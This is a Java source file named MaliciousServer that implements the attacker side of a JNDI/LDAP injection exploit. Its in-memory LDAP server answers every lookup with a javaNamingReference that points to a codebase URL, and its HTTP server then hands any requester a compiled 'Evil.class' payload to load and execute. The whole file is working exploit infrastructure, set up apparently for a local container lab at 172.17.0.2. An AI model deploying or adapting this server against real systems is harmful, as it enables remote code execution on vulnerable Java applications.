import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import io.undertow.Undertow;
import io.undertow.util.Headers;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;

public class MaliciousServer {
    private static final String LDAP_BASE = "dc=example,dc=com" ;
    private static String payloadClassname;
    public static void main (String[] args) throws IOException, LDAPException {
        String[] defaultArgs = {
                "http://172.17.0.2:8000/#Evil", // LDAP Server entrypoint
                "9999",                         // LDAP Port
                "8000",                         // HTTP Server Port
                "Evil.class"                    // Injected Java Object
        };

        payloadClassname = defaultArgs[3];
        setupLDAPServer(defaultArgs[0], Integer.parseInt(defaultArgs[1]));
        setupHTTPServer(Integer.parseInt(defaultArgs[2]));
    }

    private static void setupLDAPServer(String evilUrl, int port) throws LDAPException, MalformedURLException, UnknownHostException {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
            "listen" ,
            InetAddress.getByName("172.17.0.2"),
            port,
            ServerSocketFactory.getDefault(),
            SocketFactory.getDefault(),
            (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));

        /**
         * Our LDAP server is basically a proxy to a malicious HTTP server
         */
        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(evilUrl)));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("LDAP server listening on 172.17.0.2:" + port);
        ds.startListening();
    }

    private static void setupHTTPServer(int port) throws IOException {
        byte[] targetArray = readEvil();

        Undertow server = Undertow.builder()
            .addHttpListener(port, "172.17.0.2")

            // any request returns Evil.class
            .setHandler(exchange -> {
                System.out.println("Send HTTP class byte array result");
                exchange.getResponseHeaders().put(Headers.CONTENT_TYPE, "application/octet-stream");
                exchange.getResponseSender().send(ByteBuffer.wrap(targetArray));
            }).build();

        System.out.println("HTTP server listening on 172.17.0.2:" + port);
        server.start();
    }

    private static byte[] readEvil() throws IOException {
        InputStream is = MaliciousServer.class.getClassLoader().getResourceAsStream(payloadClassname);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        int nRead;
        byte[] data = new byte[4];

        while ((nRead = is.read(data, 0, data.length)) != -1) {
            bos.write(data, 0, nRead);
        }

        bos.flush();
        return bos.toByteArray();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private final URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                sendResult(result, base, entry);
            } catch (LDAPException | MalformedURLException e) {
                e.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            System.out.println("Base = " + base);

            URL url =
                    new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + url);
            e.addAttribute("javaClassName", "foo");

            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        }
    }
}
